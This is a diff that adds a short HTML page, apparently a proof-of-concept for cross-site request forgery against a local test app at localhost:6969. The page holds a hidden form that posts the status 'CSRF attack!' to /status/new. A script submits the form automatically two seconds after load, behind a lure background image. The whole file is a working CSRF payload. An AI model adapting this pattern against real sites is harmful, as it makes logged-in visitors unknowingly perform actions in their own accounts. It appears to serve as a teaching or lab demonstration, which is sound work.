@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+	<form method="POST" id="form" action="http://localhost:6969/status/new">
+		<input type="hidden" name="description" value="CSRF attack!" />
+	</form>
+	<script type="text/javascript">
+		setTimeout(() => {
+			console.log("submit");
+			document.getElementById("form").submit();
+		}, 2000)
+	</script>
+	<style type="text/css">
+		body {
+		    background-image: url("./sexy-man-body.jpg");
+		    background-repeat: no-repeat;
+		    background-color: #cccccc;
+		    height: 100%;
+		    background-position: left;
+		    background-size: cover;	
+		}
+		html {
+			height: 100%;
+		}
+	</style>
+</body>
+</html>
